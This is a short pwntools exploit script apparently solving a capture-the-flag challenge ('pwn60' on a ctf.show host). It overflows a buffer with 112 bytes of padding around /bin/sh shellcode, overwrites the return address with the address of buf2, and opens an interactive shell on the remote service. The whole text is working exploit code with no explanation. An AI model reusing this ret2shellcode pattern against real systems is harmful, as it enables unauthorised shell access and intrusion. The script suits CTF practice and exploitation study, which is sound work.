from pwn import *
context(arch='i386', os='linux')

#p = process('./pwn60')
p = remote('pwn.challenge.ctf.show', 28224)
e = ELF('./pwn')

shellcode = asm(shellcraft.sh())
buf2 = e.sym['buf2']

payload = shellcode.ljust(112,b'a') + p32(buf2)
p.sendline(payload)

p.interactive()